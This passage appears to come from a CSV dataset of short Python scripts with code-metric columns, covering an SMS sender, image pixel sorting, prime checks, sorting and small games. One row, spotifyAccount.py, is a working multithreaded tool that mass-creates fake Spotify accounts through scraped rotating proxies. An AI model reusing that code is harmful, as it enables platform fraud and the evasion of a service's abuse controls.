    # Set flag to 1 to simulate sending, this saves your credits while you are testing your code. # To send real message set this flag to 0
    test_flag = 0

    # -----------------------------------
    # No need to edit anything below this line
    # -----------------------------------

    values = {
        ""test"": test_flag,
        ""uname"": username,
        ""hash"": hash,
        ""message"": message,
        ""from"": sender,
        ""selectednums"": numbers,
    }

    url = ""http://www.txtlocal.com/sendsmspost.php""

    postdata = urllib.urlencode(values)
    req = urllib2.Request(url, postdata)

    print( f""Attempting to send SMS to {sname} at {snumber} on {tdate}"")
    f.write(
        f""Attempting to send SMS to {sname} at {snumber} on {tdate}""
    )

    try:
        response = urllib2.urlopen(req)
        response_url = response.geturl()
        if response_url == url:
            print(""SMS sent!"")
    except urllib2.URLError as e:
        print(""Send failed!"")
        print(e.reason)
",2203,43,53,18,13,11,0,,0,3,2,6.0,6,,9,17.509775004326936,27.0,1.0,medio,No,False,False,Low,id307
psunotify.py,"from __future__ import print_function

import re

import mechanize
import urllib2

br = mechanize.Browser()
br.addheaders = [
    (
        ""User-Agent"",
        ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36"",
    )
]
br.set_handle_robots(False)
# For page exploration
page = input(""Enter Page No:"")
# print type(page)
p = urllib2.Request(
    ""https://www.google.co.in/search?q=gate+psu+2017+ext:pdf&start="" + page
)
ht = br.open(p)
text = '<cite\sclass=""_Rm"">(.+?)</cite>'
patt = re.compile(text)
h = ht.read()
urls = re.findall(patt, h)
int = 0
while int < len(urls):
    urls[int] = urls[int].replace(""<b>"", """")
    urls[int] = urls[int].replace(""</b>"", """")
    int = int + 1

print(urls)

for url in urls:
    try:
        temp = url.split(""/"")
        q = temp[len(temp) - 1]
        if ""http"" in url:
            r = urllib2.urlopen(url)
        else:
            r = urllib2.urlopen(""http://"" + url)
        file = open(""psu2"" + q + "".pdf"", ""wb"")
        file.write(r.read())
        file.close()

        print(""Done"")
    except urllib2.URLError as e:
        print(
            ""Sorry there exists a problem with this URL Please Download this Manually ""
            + str(url)
        )
",1259,34,44,6,2,2,0,0.0,0,9,4,18.0,15,,27,66.60335893412778,114.6940428629768,2.4,medio,No,True,False,Low,id308
gambler.py,"import random
from sys import argv

stake = int(argv[1])
goals = int(argv[2])
trials = int(argv[3])

wins = 0
bets = 0

for i in range(trials):
    cash = stake
    while cash > 0 and cash < goals:
        bets += 1
        if random.randrange(0, 2) == 0:
            cash += 1
        else:
            cash -= 1
    if cash == goals:
        wins += 1
print(""Your won: "" + str(100 * wins // trials) + ""$"")
print(""Your bets: "" + str(bets // trials))
",451,19,19,3,0,0,0,0.0,0,15,8,30.0,18,,45,99.0586500259616,211.5197873163492,6.666666666666667,medio,No,False,True,Medium,id309
rotate_string.py,"def left_rotate(s, val):
    s1 = s[0:val]
    s2 = s[val:]
    return s2 + s1


def right_rotate(s, val):
    s1 = s[0 : len(s) - val]
    s2 = s[len(s) - val :]
    return s2 + s1


def circular_rotate(s):
    s = list(s)
    idx = 0
    mid = len(s) // 2
    for i in reversed(range(mid, len(s))):
        s[idx], s[i] = s[i], s[idx]
        idx += 1
    return s


s = ""aditya""
print("""".join(circular_rotate(s)))
",417,22,18,6,0,0,0,3.0,4,6,3,12.0,11,,18,42.80863530717375,68.53238859703687,1.6363636363636365,medio,No,False,False,Low,id310
text_file_replace.py,"""""""
Author:         Linjian Li (github.com/LinjianLi)
Created:        2020-04-09
Last Modified:  2020-10-17
Description:    A script that replace specified text string in a text file.
How to use:     `-f` specifying the text file,
                `-e` specifying the encoding (optional),
                `-o` specifying the old text string to be replaced),
                `-n` specifying the new text string to replace with.
""""""


def text_file_replace(file, encoding, old, new):
    lines = []
    cnt = 0
    with open(file=file, mode=""r"", encoding=encoding) as fd:
        for line in fd:
            cnt += line.count(old)
            lines.append(line.replace(old, new))
    with open(file=file, mode=""w"", encoding=encoding) as fd:
        fd.writelines(lines)
    print('{} occurence(s) of ""{}"" have been replaced with ""{}""'.format(cnt, old, new))
    return cnt


if __name__ == ""__main__"":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(""-f"", ""--file"", help=""File."")
    parser.add_argument(""-e"", ""--encoding"", default=""utf-8"", help=""Encoding."")
    parser.add_argument(""-o"", ""--old"", help=""Old string."")
    parser.add_argument(""-n"", ""--new"", help=""New string."")
    args = parser.parse_args()

    text_file_replace(args.file, args.encoding, args.old, args.new)
",1310,21,20,6,0,0,10,1.0,2,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,alto,No,False,False,Low,id311
pixel_sort.py,"""""""Pixel Sorting""""""

# Importing Libraries
import cv2
import numpy as np
import math
import colorsys
import pandas as pd
import os
import argparse
from tqdm import tqdm

# Importing the external file Library
import sound

# Taking arguments from command line
parser = argparse.ArgumentParser()  # you iniatize as such
parser.add_argument(""-f"", required=True, help=""enter fileName of your picture"")
# parser.add_argument(""-s"", required=True, help=""Speed factor of the audio to be increased or decreased"")
# parser.add_argument(""-av"", required=True, help=""Speed factor of the audio visualizer to be increased or decreased"")

# the add_argument tells you what needs to be given as an input sp its help
args = parser.parse_args()  # you take the arguments from command line

os.makedirs(""Image_sort/"" + str(args.f))
print(str(args.f).capitalize() + "" directory is created."")

# Defining all global variables
df = []
total = 0
dict, final, img_list = {}, [], []

# Create dataframe and save it as an excel file
def createDataSet(val=0, data=[]):
    global dict
    dict[len(data)] = data
    if val != 0:
        if val == max(dict.keys()):
            final_df = pd.DataFrame(dict[val], columns=[""Blue"", ""Green"", ""Red""])
            final_df.to_excel(""Image_sort/"" + str(args.f) + ""/"" + ""output.xlsx"")


# Generating colors for each row of the frame
def generateColors(c_sorted, frame, row):
    global df, img_list
    height = 25
    img = np.zeros((height, len(c_sorted), 3), np.uint8)
    for x in range(0, len(c_sorted)):
        r, g, b = c_sorted[x][0] * 255, c_sorted[x][1] * 255, c_sorted[x][2] * 255
        c = [r, g, b]
        df.append(c)
        img[:, x] = c  # the color value for the xth column , this gives the color band
        frame[row, x] = c  # changes added for every row in the frame

    createDataSet(data=df)
    return img, frame


# Measures the total number of pixels that were involved in pixel sort
def measure(count, row, col, height, width):
    global total
    total += count
    if row == height - 1 and col == width - 1:
        createDataSet(val=total)


# Step Sorting Algorithm
def step(bgr, repetitions=1):
    b, g, r = bgr
    # lum is calculated as per the way the humans view the colors
    lum = math.sqrt(0.241 * r + 0.691 * g + 0.068 * b)

    # conversion of rgb to hsv values
    h, s, v = colorsys.rgb_to_hsv(
        r, g, b
    )  # h,s,v is a better option for classifying each color

    # Repetitions are taken to decrease the noise
    h2 = int(h * repetitions)
    v2 = int(v * repetitions)

    # To get a smoother color band
    if h2 % 2 == 1:
        v2 = repetitions - v2
        lum = repetitions - lum

    return h2, lum, v2


# Threshold set for avoiding extreme sorting of the pixels
def findThreshold(lst, add):
    for i in lst:
        add.append(sum(i))
    return (max(add) + min(add)) / 2


def makeVideo():
    out = cv2.VideoWriter(
        ""Image_sort/"" + str(args.f) + ""/"" + str(args.f) + "".mp4"",
        cv2.VideoWriter_fourcc(*""mp4v""),
        16,
        (800, 500),
    )
    for count in tqdm(range(1, 500 + 1)):
        fileName = ""Image_sort/"" + str(args.f) + ""/"" + str(count) + "".jpg""
        img = cv2.imread(fileName)
        out.write(img)
        os.remove(fileName)
    out.release()


def main():
    global img_list
    img = cv2.imread(""Image/"" + str(args.f) + "".jpg"")
    img = cv2.resize(img, (800, 500))
    img_list.append(img)

    height, width, _ = img.shape
    print("">>> Row-wise Color sorting"")
    for row in tqdm(range(0, height)):
        color, color_n = [], []
        add = []

        for col in range(0, width):
            val = img[row][col].tolist()

            # val includes all rgb values between the range of 0 to 1
            # This makes the sorting easier and efficient
            val = [i / 255.0 for i in val]
            color.append(val)

        thresh = findThreshold(
            color, add
        )  # setting the threshold value for every row in the frame

        # For the specific row , if all the values are non-zero then it is sorted with color
        if np.all(np.asarray(color)) == True:
            color.sort(key=lambda bgr: step(bgr, 8))  # step sorting
            band, img = generateColors(color, img, row)
            measure(len(color), row, col, height, width)

        # For the specific row , if any of the values are zero it gets sorted with color_n
        if np.all(np.asarray(color)) == False:
            for ind, i in enumerate(color):
                # Accessing every list within color
                # Added to color_n if any of the element in the list is non-zero
                # and their sum is less than threshold  value

                if np.any(np.asarray(i)) == True and sum(i) < thresh:
                    color_n.append(i)

            color_n.sort(key=lambda bgr: step(bgr, 8))  # step sorting
            band, img = generateColors(color_n, img, row)
            measure(len(color_n), row, col, height, width)
        cv2.imwrite(""Image_sort/"" + str(args.f) + ""/"" + str(row + 1) + "".jpg"", img)

    # Writing down the final sorted image
    cv2.imwrite(
        ""Image_sort/"" + str(args.f) + ""/"" + str(args.f) + "".jpg"", img
    )  # Displaying the final picture

    print(""\n>>> Formation of the Video progress of the pixel-sorted image"")
    makeVideo()
    sound.main(
        args.f
    )  # Calling the external python file to create the audio of the pixel-sorted image


main()
",5465,99,108,36,34,25,0,7.0,23,55,9,110.0,95,,165,652.6656078044209,1105.57255349328,5.2105263157894735,medio,No,False,False,High,id312
websiteWork.py,"from speakListen import greet, hear
from speakListen import speak


"""""" 1. speakListen.speak(text)
    2. speakListen.greet()
    3. speakListen.hear()
""""""
import wikipedia
import webbrowser


def google_search():
    """"""[Goes to google and searches the website asked by the user]
    """"""
    google_search_link = ""https://www.google.co.in/search?q=""
    google_search = ""What do you want me to search on Google? ""
    print(google_search)
    speak(google_search)
    
    query = hear()

    if query != ""None"":
        webbrowser.open(google_search_link+query)
    elif query == ""None"":
        print(""I could'nt understand what you just said!"")
        speak(""I could'nt understand what you just said!"")

def wiki_search():
    """"""[Speak out the summary in wikipedia and going to the website according to user's choice.]
    """"""    
    wiki_search = ""What do you want me to search on Wikipedia? Please tell me the exact sentence or word to Search.""
    wiki_search_link = ""https://en.wikipedia.org/wiki/""
    
    print(wiki_search)
    speak(wiki_search)

    query = hear()
    try:

        if query != ""None"":
            results = wikipedia.summary(query, sentences = 2)
            print(results)
            speak(results)

            print(""Do you want me to open the Wikipedia page?"")
            speak(""Do you want me to open the Wikipedia page?"")
            q = hear().lower()

            if ""yes"" in q or ""okay"" in q or ""ok"" in q or ""opun"" in q or ""opan"" in q or ""vopen"" in q or ""es"" in q or ""s"" in q:
                print(wiki_search_link + query)
                webbrowser.open(wiki_search_link + query)

            elif query == ""None"":
                print(""I could'nt understand what you just said!"")
                speak(""I could'nt understand what you just said!"")

    except Exception as e:
        print(""Couldn't find"")

#wiki_search()
#google_search()
",1951,40,37,15,2,2,8,2.0,15,16,5,38.0,23,,54,115.65156546374811,259.5971657911106,4.130434782608695,medio,No,False,False,Medium,id313
invisible_clock.py,"# Hey you need red color cloak
import cv2

# superinposing two images

import numpy as np

import time

cap = cv2.VideoCapture(0)

time.sleep(2)  # 2 sec time to adjust cam with time

background = 0

# capturing the background
for i in range(30):  # 30 times
    ret, background = cap.read()

while cap.isOpened():
    ret, img = cap.read()

    if not ret:
        break

    hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)
    # hsv values for red color
    lower_red = np.array([0, 120, 70])
    upper_red = np.array([10, 255, 255])

    mask1 = cv2.inRange(hsv, lower_red, upper_red)  # seperating the cloak part

    lower_red = np.array([170, 120, 70])
    upper_red = np.array([180, 255, 255])

    mask2 = cv2.inRange(hsv, lower_red, upper_red)

    mask1 = mask1 + mask2  # OR (Combining)
    # #remove  noise
    mask1 = cv2.morphologyEx(
        mask1, cv2.MORPH_OPEN, np.ones((3, 3), np.uint8), iterations=2
    )

    mask1 = cv2.morphologyEx(
        mask1, cv2.MORPH_DILATE, np.ones((3, 3), np.uint8), iterations=1
    )

    # mask2 --> Everything except cloak
    mask2 = cv2.bitwise_not(mask1)

    res1 = cv2.bitwise_and(background, background, mask=mask1)  # used for segmentation
    res2 = cv2.bitwise_and(img, img, mask=mask2)  # used to substitute the cloak part

    final_output = cv2.addWeighted(res1, 1, res2, 1, 0)

    cv2.imshow(""Eureka !"", final_output)

    if cv2.waitKey(1) == 13:
        break

cap.release()
cv2.destroyAllWindows()


# Press enter to get out of window
",1501,31,35,23,13,7,0,0.0,0,3,3,5.0,5,,8,16.36452797660028,24.0,1.5,alto,No,False,False,Low,id314
factorial_perm_comp.py,"# Script Name		: factorial_perm_comp.py
# Author			: Ebiwari Williams
# Created			: 20th May 2017
# Last Modified		:
# Version			: 1.0

# Modifications		:

# Description		: Find Factorial, Permutation and Combination of a Number


def factorial(n):
    fact = 1
    while n >= 1:
        fact = fact * n
        n = n - 1

    return fact


def permutation(n, r):
    return factorial(n) / factorial(n - r)


def combination(n, r):
    return permutation(n, r) / factorial(r)


def main():
    print(""choose between operator 1,2,3"")
    print(""1) Factorial"")
    print(""2) Permutation"")
    print(""3) Combination"")

    operation = input(""\n"")

    if operation == ""1"":
        print(""Factorial Computation\n"")
        while True:
            try:
                n = int(input(""\n Enter  Value for n ""))
                print(""Factorial of {} = {}"".format(n, factorial(n)))
                break
            except ValueError:
                print(""Invalid Value"")
                continue

    elif operation == ""2"":
        print(""Permutation Computation\n"")

        while True:
            try:
                n = int(input(""\n Enter Value for n ""))
                r = int(input(""\n Enter Value for r ""))
                print(""Permutation of {}P{} = {}"".format(n, r, permutation(n, r)))
                break
            except ValueError:
                print(""Invalid Value"")
                continue

    elif operation == ""3"":
        print(""Combination Computation\n"")
        while True:
            try:
                n = int(input(""\n Enter Value for n ""))
                r = int(input(""\n Enter Value for r ""))

                print(""Combination of {}C{} = {}"".format(n, r, combination(n, r)))
                break

            except ValueError:
                print(""Invalid Value"")
                continue


if __name__ == ""__main__"":
    main()
",1875,50,50,20,7,7,0,4.0,14,10,5,20.0,15,,30,70.2129994085646,129.65784284662087,3.333333333333333,medio,No,True,False,Low,id315
reversed_pattern3.py,"#Simple inverted number triangle piramid
#11111
#2222
#333
#44
#5

def main():
    lines = int(input(""Enter no.of lines: ""))
    pattern(lines)

def pattern(lines):
    t = 1
    for i in reversed(range(1, (lines +1))):
        format = str(t)*i
        print(format)
        t = t + 1

if __name__ == ""__main__"":
    main()
",325,11,11,3,6,6,0,2.0,3,4,3,8.0,7,,12,24.406371956566694,39.86313713864836,1.7142857142857142,alto,No,True,False,Low,id316
resistance.py,"def resistance_calculator(material:str, lenght:float, section:float, temperature:float):
  """"""
  material is a string indicating the material of the wire
  
  lenght is a floating value indicating the lenght of the wire in meters

  diameter is a floating value indicating the diameter of the wire in millimeters

  temperature is a floating value indicating the temperature at which the wire is operating in Â°C

  Available materials:
  - silver
  - copper
  - aluminium
  - tungsten
  - iron
  - steel
  - zinc
  - solder""""""

  materials = {
    ""silver"": {
                ""rho"": 0.0163,
                ""coefficient"": 0.0038
              },

    ""copper"": {
                ""rho"": 0.0178,
                ""coefficient"": 0.00381
              },

    ""aluminium"": {
                  ""rho"": 0.0284,
                  ""coefficient"": 0.004
                 },

    ""tungsten"": {
                  ""rho"": 0.055,
                  ""coefficient"": 0.0045
                },

    ""iron"": {
              ""rho"": 0.098,
              ""coefficient"": 0.006
            },

    ""steel"": {
                ""rho"": 0.15,
                ""coefficient"": 0.0047
              },

    ""zinc"": {
              ""rho"": 0.06,
              ""coefficient"": 0.0037
            },

    ""solder"": {
                ""rho"": 0.12,
                ""coefficient"": 0.0043
              }
  }

  rho_20deg = materials[material][""rho""]
  temp_coefficient = materials[material][""coefficient""]

  rho = rho_20deg * (1 + temp_coefficient * (temperature - 20))
  resistance = rho * lenght / section

  return f""{resistance}Î©""
",1592,9,40,15,0,0,14,1.0,1,6,4,12.0,12,,18,51.01955000865388,72.0,2.0,alto,No,False,False,Low,id317
even.py,"num = int(input(""Enter a number: ""))
if (num % 2) == 0:
    print(""{0} is Even"".format(num))
else:
    print(""{0} is Odd"".format(num))
",135,5,5,0,0,0,0,0.0,0,2,2,4.0,4,6.0,6,10.0,15.509775004326936,1.0,medio,No,True,False,Low,id318
spotifyAccount.py,"import platform
import random
import string
import threading
import time
from os import system

import requests

if platform.system() == ""Windows"":  # checking OS
    title = ""windows""
else:
    title = ""linux""


def randomName(size=10, chars=string.ascii_letters + string.digits):
    return """".join(random.choice(chars) for i in range(size))


def randomPassword(size=14, chars=string.ascii_letters + string.digits):
    return """".join(random.choice(chars) for i in range(size))


global maxi
global created

created = 0
errors = 0


class proxy:
    def update(self):
        while True:

            data = """"
            urls = [
                ""https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&ssl=yes""
            ]
            for url in urls:
                data += requests.get(url).text
                self.splited += data.split(""\r\n"")  # scraping and splitting proxies
            time.sleep(600)

    def get_proxy(self):
        random1 = random.choice(self.splited)  # choose a random proxie
        return random1

    def FormatProxy(self):
        proxyOutput = {""https"": ""socks4://"" + self.get_proxy()}
        return proxyOutput

    def __init__(self):
        self.splited = []
        threading.Thread(target=self.update).start()
        time.sleep(3)


proxy1 = proxy()


def creator():
    global maxi
    global created
    global errors
    while maxi > created:
        if title == ""windows"":
            system(
                ""title ""
                + f""Spotify Account Creator by KevinLage https://github.com/KevinLage/Spotify-Account-Creator Created: {created}/{maxi} Errors:{errors}""
            )

        s = requests.session()

        email = randomName()
        password = randomPassword()

        data = {
            ""displayname"": ""Josh"",
            ""creation_point"": ""https://login.app.spotify.com?utm_source=spotify&utm_medium=desktop-win32&utm_campaign=organic"",
            ""birth_month"": ""12"",
            ""email"": email + ""@gmail.com"",
            ""password"": password,
            ""creation_flow"": ""desktop"",
            ""platform"": ""desktop"",
            ""birth_year"": ""1991"",
            ""iagree"": ""1"",
            ""key"": ""4c7a36d5260abca4af282779720cf631"",
            ""birth_day"": ""17"",
            ""gender"": ""male"",
            ""password_repeat"": password,
            ""referrer"": """",
        }

        try:

            r = s.post(
                ""https://spclient.wg.spotify.com/signup/public/v1/account/"",
                data=data,
                proxies=proxy1.FormatProxy(),
            )
            if '{""status"":1,""' in r.text:
                open(""created.txt"", ""a+"").write(email + ""@gmail.com:"" + password + ""\n"")
                created += 1
                if title == ""windows"":
                    system(
                        ""title ""
                        + f""Spotify Account Creator : {created}/{maxi} Errors:{errors}""
                    )
            else:
                errors += 1
        except:
            pass


maxi = int(input(""How many accounts do you want to create?\n""))

maxthreads = int(input(""How many Threads?\n""))
num = 0

while num < maxthreads:
    num += 1
    threading.Thread(target=creator).start()  # Start Checking Thread
",3269,69,94,28,4,0,0,7.0,18,18,5,36.0,29,34.0,54,152.49108933313642,274.7229934275184,3.103448275862069,bajo,Yes,True,True,Low-Medium,id319
backup_automater_services.py,"# Script Name	: backup_automater_services.py
# Author			: Craig Richards
# Created			: 24th October 2012
# Last Modified	: 13th February 2016
# Version			: 1.0.1

# Modifications	: 1.0.1 - Tidy up the comments and syntax

# Description		: This will go through and backup all my automator services workflows

import datetime  # Load the library module
import os  # Load the library module
import shutil  # Load the library module

today = datetime.date.today()  # Get Today's date
todaystr = (
    today.isoformat()
)  # Format it so we can use the format to create the directory

confdir = os.getenv(
    ""my_config""
)  # Set the variable by getting the value from the OS setting
dropbox = os.getenv(
    ""dropbox""
)  # Set the variable by getting the value from the OS setting
conffile = ""services.conf""  # Set the variable as the name of the configuration file
conffilename = os.path.join(
    confdir, conffile
)  # Set the variable by combining the path and the file name
sourcedir = os.path.expanduser(
    ""~/Library/Services/""
)  # Source directory of where the scripts are located
# Combine several settings to create
destdir = os.path.join(
    dropbox, ""My_backups"" + ""/"" + ""Automater_services"" + todaystr + ""/""
)

# the destination backup directory
for file_name in open(conffilename):  # Walk through the configuration file
    fname = file_name.strip()  # Strip out the blank lines from the configuration file
    if fname:  # For the lines that are not blank
        sourcefile = os.path.join(
            sourcedir, fname
        )  # Get the name of the source files to backup
        destfile = os.path.join(
            destdir, fname
        )  # Get the name of the destination file names
        shutil.copytree(sourcefile, destfile)  # Copy the directories
",1779,17,33,6,25,9,0,0.0,0,4,1,8.0,7,,12,19.651484454403228,36.0,0.5714285714285714,alto,No,False,False,Low,id320
check_prime.py,"# Author:       Tan Duc Mai
# Email:        tan.duc.work@gmail.com
# Description:  Three different functions to check whether a given number is a prime.
#               Return True if it is a prime, False otherwise.
#               Those three functions, from a to c, decreases in efficiency
#               (takes longer time).

from math import sqrt


def is_prime_a(n):
    if n < 2:
        return False
    sqrt_n = int(sqrt(n))
    for i in range(2, sqrt_n + 1):
        if n % i == 0:
            return False
    return True


def is_prime_b(n):
    if n > 1:
        if n == 2:
            return True
        else:
            for i in range(2, n):
                if n % i == 0:
                    return False
            return True
    return False


def is_prime_c(n):
    divisible = 0
    for i in range(1, n + 1):
        if n % i == 0:
            divisible += 1
    if divisible == 2:
        return True
    return False
",983,27,27,7,6,6,0,3.0,13,13,5,26.0,20,,39,98.04820237218406,181.11039140121423,3.25,medio,No,False,False,Low-Medium,id321
EncryptionTool.py,"# GGearing
# Simple encryption script for text
# This was one my first versions of this script
# 09/07/2017
from __future__ import print_function

import math

try:
    input = raw_input
except NameError:
    pass

key = int(math.pi * 1e14)
text = input(""Enter text: "")
values = reverse = []


def encryptChar(target):
    # encrytion algorithm
    target = ((target + 42) * key) - 449
    return target


def decryptChar(target):
    target = ((target + 449) / key) - 42
    return target


def encrypt(input_text):
    col_values = []
    for inp in input_text:
        current = ord(inp)
        current = encryptChar(current)
        col_values.append(current)
    return col_values


def decrypt(enc_text):
    col_values = []
    for enc in enc_text:
        current = int(decryptChar(enc))
        current = chr(current)
        col_values.append(current)
    return col_values


def readAndDecrypt(filename):
    file = open(filename, ""r"")
    data = file.read()
    datalistint = []
    actualdata = []
    datalist = data.split("" "")
    datalist.remove("""")
    datalistint = [float(data) for data in datalist]
    for data in datalist:
        current1 = int(decryptChar(data))
        current1 = chr(current1)
        actualdata.append(current1)
    file.close()
    return actualdata


def readAndEncrypt(filename):
    file = open(filename, ""r"")
    data = file.read()
    datalist = list(data)
    encrypted_list = list()
    encrypted_list_str = list()
    for data in datalist:
        current = ord(data)
        current = encryptChar(current)
        encrypted_list.append(current)
    file.close()
    return encrypted_list


def readAndEncryptAndSave(inp_file, out_file):
    enc_list = readAndEncrypt(inp_file)
    output = open(out_file, ""w"")
    for enc in enc_list:
        output.write(str(enc) + "" "")
    output.close()


def readAndDecryptAndSave(inp_file, out_file):
    dec_list = readAndDecrypt(inp_file)
    output = open(out_file, ""w"")
    for dec in dec_list:
        output.write(str(dec))
    output.close()


# encryption
for t in text:
    current = ord(t)
    current = encryptChar(current)
    values.append(current)

# decryption
for v in values:
    current = int(decryptChar(v))
    current = chr(current)
    reverse.append(current)
print(reverse)

# saves encrypted in txt file
output = open(""encrypted.txt"", ""w"")
for v in values:
    output.write(str(v) + "" "")
output.close()

# read and decrypts
print(readAndDecrypt(""encrypted.txt""))
",2481,81,81,24,9,9,0,8.0,15,9,4,18.0,18,,27,83.05865002596161,120.40465370320705,2.0,medio,No,True,False,Low,id322
Merge_linked_list.py,"# Python3 program merge two sorted linked
# in third linked list using recursive.

# Node class
class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


# Constructor to initialize the node object
class LinkedList:

    # Function to initialize head
    def __init__(self):
        self.head = None
        self.tail = None

    # Method to print linked list
    def printList(self):
        temp = self.head

        while temp:
            print(temp.data, end=""->"")
            temp = temp.next

    # Function to add of node at the end.
    def append(self, new_data):
        new_node = Node(new_data)

        if self.head is None:
            self.head = new_node
            self.tail = new_node
            return
        self.tail.next = new_node
        self.tail = self.tail.next


# Function to merge two sorted linked list.
def mergeLists(head1, head2):

    # create a temp node NULL
    temp = None

    # List1 is empty then return List2
    if head1 is None:
        return head2

    # if List2 is empty then return List1
    if head2 is None:
        return head1

    # If List1's data is smaller or
    # equal to List2's data
    if head1.data <= head2.data:

        # assign temp to List1's data
        temp = head1

        # Again check List1's data is smaller or equal List2's
        # data and call mergeLists function.
        temp.next = mergeLists(head1.next, head2)

    else:
        # If List2's data is greater than or equal List1's
        # data assign temp to head2
        temp = head2

        # Again check List2's data is greater or equal List's
        # data and call mergeLists function.
        temp.next = mergeLists(head1, head2.next)

    # return the temp list.
    return temp


# Driver Function
if __name__ == ""__main__"":

    # Create linked list :
    # 10->20->30->40->50
    list1 = LinkedList()
    list1.append(10)
    list1.append(20)
    list1.append(30)
    list1.append(40)
    list1.append(50)

    # Create linked list 2 :
    # 5->15->18->35->60
    list2 = LinkedList()
    list2.append(5)
    list2.append(15)
    list2.append(18)
    list2.append(35)
    list2.append(60)

    # Create linked list 3
    list3 = LinkedList()

    # Merging linked list 1 and linked list 2
    # in linked list 3
    list3.head = mergeLists(list1.head, list2.head)

    print("" Merged Linked List is : "", end="""")
    list3.printList()
",2426,51,51,26,29,29,0,5.0,15,5,3,10.0,8,,15,28.75488750216347,51.89147427955947,1.875,medio,Yes,False,False,Low,id323
pygame.py,"# author-slayking1965
""""""
This is a game very similar to stone paper scissor
In this game :
if computer chooses snake and user chooses water, the snake will drink water and computer wins.
If computer chooses gun and user chooses water, the gun gets drown into water and user wins.
And so on for other cases
""""""

import random
import time

choices = {""S"": ""Snake"", ""W"": ""Water"", ""G"": ""Gun""}

x = 0
com_win = 0
user_win = 0
match_draw = 0

print(""Welcome to the Snake-Water-Gun Game\n"")
print(""I am Mr. Computer, We will play this game 10 times"")
print(""Whoever wins more matches will be the winner\n"")

while x < 10:
    print(f""Game No. {x+1}"")
    for key, value in choices.items():
        print(f""Choose {key} for {value}"")

    com_choice = random.choice(list(choices.keys())).lower()
    user_choice = input(""\n----->"").lower()

    if user_choice == ""s"" and com_choice == ""w"":
        com_win += 1

    elif user_choice == ""s"" and com_choice == ""g"":
        com_win += 1

    elif user_choice == ""w"" and com_choice == ""s"":
        user_win += 1

    elif user_choice == ""g"" and com_choice == ""s"":
        user_win += 1

    elif user_choice == ""g"" and com_choice == ""w"":
        com_win += 1

    elif user_choice == ""w"" and com_choice == ""g"":
        user_win += 1

    elif user_choice == com_choice:
        match_draw += 1

    else:
        print(""\n\nYou entered wrong !!!!!!"")
        x = 0
        print(""Restarting the game"")
        print("""")
        time.sleep(1)
        continue

    x += 1
    print(""\n"")


print(""Here are final stats of the 10 matches : "")
print(f""Mr. Computer won : {com_win} matches"")
print(f""You won : {user_win} matches"")
print(f""Matches Drawn : {match_draw}"")

if com_win > user_win:
    print(""\n-------Mr. Computer won-------"")

elif com_win < user_win:
    print(""\n-----------You won-----------"")

else:
    print(""\n----------Match Draw----------"")
",1898,51,49,20,1,1,7,,0,31,5,62.0,23,,93,115.65156546374811,447.0840077513572,6.739130434782608,medio,No,True,True,Medium-High,id324
days_from_date.py,"import re  # regular expressions
import calendar  # module of python to provide useful fucntions related to calendar
import datetime  # module of python to get the date and time
import tkinter as tk

root = tk.Tk()
root.geometry(""400x250+50+50"")
user_input1 = tk.StringVar()


def process_date(user_input):
    user_input = re.sub(r""/"", "" "", user_input)  # substitute / with space
    user_input = re.sub(r""-"", "" "", user_input)  # substitute - with space
    return user_input


def find_day(date):
    born = datetime.datetime.strptime(
        date, ""%d %m %Y""
    ).weekday()  # this statement returns an integer corresponding to the day of the week
    return calendar.day_name[
        born
    ]  # this statement returns the corresponding day name to the integer generated in the previous statement


# To get the input from the user
# User may type 1/2/1999 or 1-2-1999
# To overcome those we have to process user input and make it standard to accept as defined by  calender and time module
def printt():
    user_input = user_input1.get()
    date = process_date(user_input)
    c = ""Day on "" + user_input + ""  is "" + find_day(date)
    label2 = tk.Label(root, text=c, font=(""Times new roman"", 20), fg=""black"").place(
        x=20, y=200
    )


lbl = tk.Label(root, text=""Date --"", font=(""Ubuntu"", 20), fg=""black"").place(
    x=0, y=0.1, height=60, width=150
)
lbl1 = tk.Label(root, text=""(DD/MM/YYYY)"", font=(""Ubuntu"", 15), fg=""Gray"").place(
    x=120, y=0.1, height=60, width=150
)
but = tk.Button(
    root,
    text=""Check"",
    command=printt,
    cursor=""hand2"",
    font=(""Times new roman"", 40),
    fg=""white"",
    bg=""black"",
).place(x=50, y=130, height=50, width=300)
Date = tk.Entry(
    root, font=(""Times new roman"", 20), textvariable=user_input1, bg=""white"", fg=""black""
).place(x=30, y=50, height=40, width=340)

root.mainloop()
",1910,24,44,10,10,3,0,3.0,3,3,1,,6,,9,15.509775004326936,25.26619429851844,0.5,alto,No,False,False,Low,id325
generate_permutations.py,"def generate(A,k):
    if k ==1:
        print(A)
        return
    else:
        for i in range(k):
            generate(A,k-1)
            if(i<k-1):
                if k%2 == 0:
                    A[i],A[k-1] = A[k-1],A[i]
                else:
                    A[0],A[k-1] = A[k-1],A[0]

A = [1,2,3,4] #test-case
x = len(A)
generate(A,x)
",347,15,15,1,1,0,0,1.0,5,10,4,20.0,7,,30,27.651484454403228,103.78294855911894,5.714285714285714,medio,No,False,False,Low-Medium,id326
Count sort.py,"def counting_sort(array1, max_val):
    m = max_val + 1
    count = [0] * m

    for a in array1:
        # count occurences
        count[a] += 1
    i = 0
    for a in range(m):
        for c in range(count[a]):
            array1[i] = a
            i += 1
    return array1


print(counting_sort([1, 2, 7, 3, 2, 1, 4, 2, 3, 2, 1], 7))
",338,12,12,3,1,1,0,1.0,4,4,2,8.0,6,8.0,12,17.509775004326936,36.0,1.3333333333333333,alto,No,False,False,Low,id327
merge.py,"from __future__ import print_function

import os

# author:zhangshuyx@gmail.com
# !/usr/bin/env python
# -*- coding=utf-8 -*-

# define the result filename
resultfile = ""result.csv""


# the merge func
def merge():
    """"""merge csv files to one file""""""

    # indicates use of a global variable.
    global resultfile

    # use list save the csv files
    csvfiles = [
        f
        for f in os.listdir(""."")
        if f != resultfile and (len(f.split(""."")) >= 2) and f.split(""."")[1] == ""csv""
    ]

    # open file to write
    with open(resultfile, ""w"") as writefile:
        for csvfile in csvfiles:
            with open(csvfile) as readfile:
                print(""File {} readed."".format(csvfile))

                # do the read and write
                writefile.write(readfile.read() + ""\n"")
    print(""\nFile {} wrote."".format(resultfile))


# the main program


def main():
    print(""\t\tMerge\n\n"")
